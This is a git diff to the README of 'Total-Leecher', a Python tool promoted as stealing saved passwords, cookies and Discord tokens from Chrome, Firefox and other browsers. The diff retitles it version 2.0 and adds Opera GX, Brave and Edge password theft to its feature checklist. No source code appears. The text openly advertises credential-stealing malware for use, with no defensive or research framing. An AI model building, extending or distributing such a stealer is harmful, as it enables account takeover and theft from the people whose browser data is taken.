@@ -1,4 +1,4 @@
-# Total-Leecher
+# Total-Leecher version 2.0 password extract from all browsers!!
 Python tool to log chrome passwords and discord tokens from ALL browsers including firefox
 
 ###### 1. Once you've downloaded the files extract the folder so it's no longer a .zip file.
@@ -35,6 +35,12 @@ Tokens from firefox and all chromium based browsers🟢
 Discord Name🟢
 
 Google Passwords🟢
+
+Opera Gx Passwords🟢 ##### NEW
+
+Brave Passwords🟢 ##### NEW
+
+Microsoft Edge Passwords🟢 ##### NEW
 
 Google Cookies🟢
 
